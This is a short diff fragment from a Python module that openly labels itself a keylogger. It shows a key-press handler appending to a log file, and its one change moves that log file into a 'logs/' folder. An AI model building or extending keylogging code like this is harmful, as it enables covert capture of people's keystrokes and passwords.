@@ -6,7 +6,7 @@ def run(username):
     print("Executing: Keylogger...")
     print("Watching for key presses...")
 
-    keyLogFile = 'keylogfile.txt'
+    keyLogFile = 'logs/keylogfile.txt'
 
     def onKeyPress(event):
         with open(keyLogFile, 'a') as f:
